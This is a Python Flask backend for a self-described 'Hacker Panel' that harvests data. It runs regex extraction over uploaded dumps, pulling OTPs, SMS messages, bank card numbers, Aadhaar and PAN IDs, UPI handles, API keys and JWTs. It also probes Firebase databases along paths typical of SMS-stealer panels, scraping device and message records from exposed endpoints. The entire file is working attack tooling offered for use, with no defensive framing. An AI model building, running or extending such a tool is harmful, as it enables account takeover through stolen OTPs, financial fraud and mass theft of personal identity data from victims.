#!/usr/bin/env python3
"""
Hacker Panel - Extraction Backend
Handles file uploads, multi-technique extraction, Firebase probing, and global dashboard.
"""

import os
import re
import json
import time
import uuid
import threading
import urllib.request
import urllib.error
from pathlib import Path
from flask import Flask, request, jsonify, send_from_directory, Response, stream_with_context

app = Flask(__name__, static_folder='.', static_url_path='')

UPLOAD_DIR = Path(__file__).parent / "uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

# Global in-memory results store (persisted to disk)
RESULTS_FILE = Path(__file__).parent / "results_store.json"
_results_lock = threading.Lock()

def load_results():
    try:
        if RESULTS_FILE.exists():
            return json.loads(RESULTS_FILE.read_text(encoding='utf-8', errors='ignore'))
    except:
        pass
    return {"devices": [], "sms": [], "phones": [], "otps": [], "firebase": [], "uploads": []}

def save_results(data):
    try:
        RESULTS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')
    except:
        pass

GLOBAL_RESULTS = load_results()

# ============================================================
# EXTRACTION ENGINE — Multiple Techniques
# ============================================================

# Compiled regexes for performance
RE_PHONE_INTL = re.compile(r'\+?(?:91|92|880|977|94|1)\d{9,12}')
RE_PHONE_BARE = re.compile(r'(?<!\d)(?:6|7|8|9)\d{9}(?!\d)')
RE_IMEI = re.compile(r'(?<!\d)\d{15}(?!\d)')
RE_OTP = re.compile(r'\b(?:OTP|otp|One.?Time|Verification|verify|code)[:\s#-]*(\d{4,8})\b', re.I)
RE_OTP_BARE = re.compile(r'(?<!\d)(\d{6})(?!\d)')
RE_EMAIL = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
RE_FIREBASE_URL = re.compile(r'https://[\w\-]+\.firebaseio\.com')
RE_PACKAGE = re.compile(r'[a-z][a-z0-9_]*(?:\.[a-z][a-z0-9_]*){2,}')
RE_IP = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
RE_IMSI = re.compile(r'(?<!\d)\d{14,15}(?!\d)')
RE_SIM_SERIAL = re.compile(r'89\d{17,19}')
RE_BANK_CARD = re.compile(r'(?<!\d)(?:4|5|6)\d{15}(?!\d)')
RE_AADHAAR = re.compile(r'(?<!\d)\d{4}\s?\d{4}\s?\d{4}(?!\d)')
RE_PAN = re.compile(r'[A-Z]{5}\d{4}[A-Z]')
RE_API_KEY = re.compile(r'(?:api[_\-]?key|apikey|auth[_\-]?token)["\s:=]+([A-Za-z0-9_\-]{20,})', re.I)
RE_FIREBASE_KEY = re.compile(r'AIza[0-9A-Za-z_\-]{35}')
RE_JWT = re.compile(r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+')
RE_ANDROID_ID = re.compile(r'(?<![0-9a-f])[0-9a-f]{16}(?![0-9a-f])')
RE_DEVICE_ID_LONG = re.compile(r'[0-9a-f]{32}')
RE_UPI = re.compile(r'[a-zA-Z0-9._\-]+@[a-zA-Z]{3,}')
RE_IFSC = re.compile(r'[A-Z]{4}0[A-Z0-9]{6}')

def extract_from_text(text, source="unknown"):
    """Run all extraction techniques on a text blob."""
    results = {
        "source": source,
        "timestamp": int(time.time()),
        "phones": [],
        "imeis": [],
        "otps": [],
        "emails": [],
        "firebase_urls": [],
        "firebase_keys": [],
        "api_keys": [],
        "jwts": [],
        "android_ids": [],
        "device_ids": [],
        "bank_cards": [],
        "aadhaar": [],
        "pan": [],
        "upi": [],
        "ifsc": [],
        "packages": [],
        "ips": [],
        "raw_sms": [],
    }
    
    # Phone numbers
    phones_intl = RE_PHONE_INTL.findall(text)
    phones_bare = RE_PHONE_BARE.findall(text)
    all_phones = list(set(phones_intl + phones_bare))
    results["phones"] = all_phones[:500]
    
    # IMEI
    results["imeis"] = list(set(RE_IMEI.findall(text)))[:100]
    
    # OTPs
    otps_labeled = RE_OTP.findall(text)
    otps_bare = RE_OTP_BARE.findall(text)
    results["otps"] = list(set(otps_labeled + otps_bare))[:200]
    
    # Emails
    results["emails"] = list(set(RE_EMAIL.findall(text)))[:200]
    
    # Firebase
    results["firebase_urls"] = list(set(RE_FIREBASE_URL.findall(text)))[:100]
    results["firebase_keys"] = list(set(RE_FIREBASE_KEY.findall(text)))[:50]
    
    # API Keys
    api_keys_raw = RE_API_KEY.findall(text)
    results["api_keys"] = list(set(api_keys_raw))[:50]
    
    # JWTs
    results["jwts"] = list(set(RE_JWT.findall(text)))[:20]
    
    # Android IDs
    results["android_ids"] = list(set(RE_ANDROID_ID.findall(text)))[:200]
    
    # Bank cards
    results["bank_cards"] = list(set(RE_BANK_CARD.findall(text)))[:50]
    
    # Aadhaar (India ID)
    results["aadhaar"] = list(set(RE_AADHAAR.findall(text)))[:50]
    
    # PAN card
    results["pan"] = list(set(RE_PAN.findall(text)))[:50]
    
    # UPI IDs
    upis = [u for u in RE_UPI.findall(text) if not u.endswith(('.com', '.org', '.net', '.io', '.in'))]
    results["upi"] = list(set(upis))[:100]
    
    # IFSC codes
    results["ifsc"] = list(set(RE_IFSC.findall(text)))[:50]
    
    # Package names
    pkgs = [p for p in RE_PACKAGE.findall(text) if len(p) > 8 and p.count('.') >= 2]
    results["packages"] = list(set(pkgs))[:50]
    
    # IPs
    results["ips"] = list(set(RE_IP.findall(text)))[:100]
    
    return results


def extract_from_json_deep(data, source="json", path=""):
    """Recursively traverse JSON, collecting SMS-like structures."""
    found = {"sms": [], "devices": []}
    
    if isinstance(data, dict):
        keys = set(k.lower() for k in data.keys())
        # SMS-like record detection
        if any(k in keys for k in ['body', 'message', 'msg', 'sms', 'text']):
            body = data.get('body', data.get('message', data.get('msg', data.get('text', ''))))
            sender = data.get('address', data.get('sender', data.get('number', data.get('from', 'Unknown'))))
            timestamp = data.get('date', data.get('timestamp', data.get('time', '')))
            if body and str(body).strip():
                otp_match = RE_OTP.search(str(body)) or RE_OTP_BARE.search(str(body))
                found["sms"].append({
                    "body": str(body)[:500],
                    "sender": str(sender),
                    "timestamp": str(timestamp),
                    "otp": otp_match.group(1) if otp_match else None,
                    "path": path,
                    "source": source,
                })
        
        # Device-like record detection
        if any(k in keys for k in ['mobno', 'mobile', 'phonenumber', 'phone', 'imei', 'deviceid', 'androidid']):
            phone = (data.get('mobNo') or data.get('mobile') or data.get('phoneNumber') or
                     data.get('phone') or data.get('number') or '')
            imei = data.get('imei', data.get('IMEI', ''))
            model = data.get('model', data.get('Model', data.get('deviceModel', '')))
            name = data.get('name', data.get('Name', ''))
            status = data.get('status', data.get('online', False))
            found["devices"].append({
                "phone": str(phone),
                "imei": str(imei),
                "model": str(model),
                "name": str(name),
                "status": bool(status),
                "source": source,
                "path": path,
            })
        
        for k, v in data.items():
            sub = extract_from_json_deep(v, source, path + '.' + str(k))
            found["sms"].extend(sub["sms"])
            found["devices"].extend(sub["devices"])
    
    elif isinstance(data, list):
        for i, item in enumerate(data):
            sub = extract_from_json_deep(item, source, path + f'[{i}]')
            found["sms"].extend(sub["sms"])
            found["devices"].extend(sub["devices"])
    
    return found


# ============================================================
# FIREBASE PROBING
# ============================================================

FIREBASE_PATHS = [
    "", "clients", "devices", "users", "bots", "Data", "All_Users",
    "All_Users/simDetails", "All_Users/Data/DeviceInfo", "messages",
    "sms", "user_sms", "All_Users/sms", "user_data", "Ede",
    "admin", "panel", "clients/sms",
]

def probe_firebase(base_url, auth_key="", extra_paths=None):
    """Probe a Firebase URL and collect all accessible data."""
    base_url = base_url.rstrip('/').rstrip('.json')
    if base_url.endswith('.json'): base_url = base_url[:-5]
    
    auth_q = f"?auth={auth_key}" if auth_key and auth_key.lower() not in ['public', 'none', ''] else ""
    paths = (extra_paths or []) + FIREBASE_PATHS
    
    results = {"url": base_url, "endpoints": [], "devices": [], "sms": [], "phones": []}
    
    for path in paths:
        url = f"{base_url}/{path}.json{auth_q}" if path else f"{base_url}/.json{auth_q}"
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=5)
            raw = resp.read().decode('utf-8', errors='ignore')
            data = json.loads(raw)
            
            if not data or data == 'null':
                continue
            
            count = len(data) if isinstance(data, (dict, list)) else 0
            results["endpoints"].append({"path": path or "/", "count": count, "url": url})
            
            # Deep extract
            deep = extract_from_json_deep(data, source=base_url, path=path)
            results["sms"].extend(deep["sms"])
            results["devices"].extend(deep["devices"])
            
            # Also run text extraction
            text_results = extract_from_text(raw, source=url)
            results["phones"].extend(text_results["phones"])
            
        except urllib.error.HTTPError as e:
            if e.code not in [404, 401, 403, 423]:
                results["endpoints"].append({"path": path or "/", "error": e.code, "url": url})
        except:
            pass
    
    # Deduplicate
    results["phones"] = list(set(results["phones"]))
    return results


# ============================================================
# API ROUTES
# ============================================================

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def static_files(filename):
    return send_from_directory('.', filename)

@app.route('/api/results', methods=['GET'])
def get_results():
    with _results_lock:
        return jsonify(GLOBAL_RESULTS)

@app.route('/api/results/clear', methods=['POST'])
def clear_results():
    global GLOBAL_RESULTS
    with _results_lock:
        GLOBAL_RESULTS = {"devices": [], "sms": [], "phones": [], "otps": [], "firebase": [], "uploads": []}
        save_results(GLOBAL_RESULTS)
    return jsonify({"ok": True})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    
    f = request.files['file']
    filename = f.filename or 'unknown'
    upload_id = str(uuid.uuid4())[:8]
    safe_name = f"upload_{upload_id}_{filename[-80:]}"
    save_path = UPLOAD_DIR / safe_name
    
    # Stream to disk
    f.save(str(save_path))
    file_size = save_path.stat().st_size
    
    # Extract text content
    try:
        raw = save_path.read_bytes()
        # Try UTF-8, fall back to latin-1
        try:
            text = raw.decode('utf-8', errors='ignore')
        except:
            text = raw.decode('latin-1', errors='ignore')
    except:
        return jsonify({"error": "Could not read file"}), 500
    
    # Text extraction
    text_results = extract_from_text(text, source=filename)
    
    # JSON extraction
    json_results = {"sms": [], "devices": []}
    try:
        data = json.loads(text)
        json_results = extract_from_json_deep(data, source=filename)
    except:
        # Not JSON, still got text results above
        pass
    
    # Merge into global store
    with _results_lock:
        GLOBAL_RESULTS["phones"].extend(text_results["phones"])
        GLOBAL_RESULTS["otps"].extend(text_results["otps"])
        GLOBAL_RESULTS["sms"].extend(json_results["sms"])
        GLOBAL_RESULTS["devices"].extend(json_results["devices"])
        GLOBAL_RESULTS["firebase"].extend(text_results["firebase_urls"])
        
        # Deduplicate phones
        GLOBAL_RESULTS["phones"] = list(set(GLOBAL_RESULTS["phones"]))
        GLOBAL_RESULTS["firebase"] = list(set(GLOBAL_RESULTS["firebase"]))
        
        GLOBAL_RESULTS["uploads"].append({
            "id": upload_id,
            "filename": filename,
            "size": file_size,
            "timestamp": int(time.time()),
            "phones_found": len(text_results["phones"]),
            "sms_found": len(json_results["sms"]),
            "devices_found": len(json_results["devices"]),
            "otps_found": len(text_results["otps"]),
        })
        save_results(GLOBAL_RESULTS)
    
    return jsonify({
        "ok": True,
        "upload_id": upload_id,
        "filename": filename,
        "size": file_size,
        "extraction": {
            "phones": text_results["phones"][:50],
            "otps": text_results["otps"][:50],
            "imeis": text_results["imeis"][:30],
            "emails": text_results["emails"][:30],
            "firebase_urls": text_results["firebase_urls"],
            "firebase_keys": text_results["firebase_keys"],
            "api_keys": text_results["api_keys"],
            "jwts": text_results["jwts"],
            "android_ids": text_results["android_ids"][:30],
            "bank_cards": text_results["bank_cards"],
            "aadhaar": text_results["aadhaar"],
            "pan": text_results["pan"],
            "upi": text_results["upi"][:30],
            "packages": text_results["packages"][:20],
            "ips": text_results["ips"][:30],
            "sms_records": json_results["sms"][:100],
            "device_records": json_results["devices"][:100],
        }
    })

@app.route('/api/firebase/probe', methods=['POST'])
def firebase_probe():
    """Probe one or more Firebase URLs."""
    body = request.get_json(force=True) or {}
    raw_input = body.get('url', '').strip()
    auth_key = body.get('auth_key', '').strip()
    bulk = body.get('bulk', False)
    
    all_results = []
    
    if bulk:
        # Bulk mode: each line is "baseurl.com/path1.json|path2.json"
        lines = [l.strip() for l in raw_input.splitlines() if l.strip()]
        for line in lines:
            if '|' in line:
                parts = line.split('|')
                base = parts[0].split('/')[0] if '/' in parts[0] else parts[0]
                base = f"https://{base}" if not base.startswith('http') else base
                extra_paths = []
                for p in parts:
                    # Extract path from full URL or just path
                    if '/' in p:
                        extra_paths.append(p.split('/', 3)[-1].rstrip('.json'))
                result = probe_firebase(base, auth_key, extra_paths)
            else:
                result = probe_firebase(line, auth_key)
            all_results.append(result)
    else:
        # Single mode — may still have pipe-separated paths
        if '|' in raw_input:
            parts = raw_input.split('|')
            base_part = parts[0]
            base = base_part.rsplit('/', 1)[0] if '/' in base_part else base_part
            extra_paths = []
            for p in parts:
                if '/' in p:
                    extra_paths.append(p.split('/', 3)[-1].rstrip('.json'))
            result = probe_firebase(base, auth_key, extra_paths)
        else:
            result = probe_firebase(raw_input, auth_key)
        all_results.append(result)
    
    # Merge into global store
    with _results_lock:
        for r in all_results:
            GLOBAL_RESULTS["devices"].extend(r.get("devices", []))
            GLOBAL_RESULTS["sms"].extend(r.get("sms", []))
            GLOBAL_RESULTS["phones"].extend(r.get("phones", []))
            GLOBAL_RESULTS["firebase"].append(r.get("url", ""))
        GLOBAL_RESULTS["phones"] = list(set(GLOBAL_RESULTS["phones"]))
        GLOBAL_RESULTS["firebase"] = list(set(GLOBAL_RESULTS["firebase"]))
        save_results(GLOBAL_RESULTS)
    
    return jsonify({"ok": True, "results": all_results})

@app.route('/api/firebase/scan', methods=['POST'])
def firebase_scan():
    """Quick scan a Firebase URL for accessible endpoints."""
    body = request.get_json(force=True) or {}
    url = body.get('url', '').strip()
    auth_key = body.get('auth_key', '').strip()
    
    if not url:
        return jsonify({"error": "URL required"}), 400
    
    base = url.rstrip('/').rstrip('.json')
    auth_q = f"?auth={auth_key}" if auth_key and auth_key.lower() not in ['public', 'none', ''] else ""
    
    endpoints = []
    for path in FIREBASE_PATHS:
        test_url = f"{base}/{path}.json{auth_q}" if path else f"{base}/.json{auth_q}"
        try:
            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=3)
            data = json.loads(resp.read().decode('utf-8', errors='ignore'))
            if data:
                count = len(data) if isinstance(data, (dict, list)) else 1
                endpoints.append({"path": path or "/", "count": count, "status": "open", "url": test_url})
        except urllib.error.HTTPError as e:
            if e.code in [401, 403]:
                endpoints.append({"path": path or "/", "status": "auth_required", "url": test_url})
        except:
            pass
    
    return jsonify({"ok": True, "url": base, "endpoints": endpoints})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    with _results_lock:
        return jsonify({
            "phones": len(set(GLOBAL_RESULTS.get("phones", []))),
            "sms": len(GLOBAL_RESULTS.get("sms", [])),
            "devices": len(GLOBAL_RESULTS.get("devices", [])),
            "otps": len(GLOBAL_RESULTS.get("otps", [])),
            "firebase_urls": len(set(GLOBAL_RESULTS.get("firebase", []))),
            "uploads": len(GLOBAL_RESULTS.get("uploads", [])),
        })

if __name__ == '__main__':
    print("=" * 50)
    print("  🔥 Hacker Panel — Extraction Backend")
    print("  Running on http://0.0.0.0:5001")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
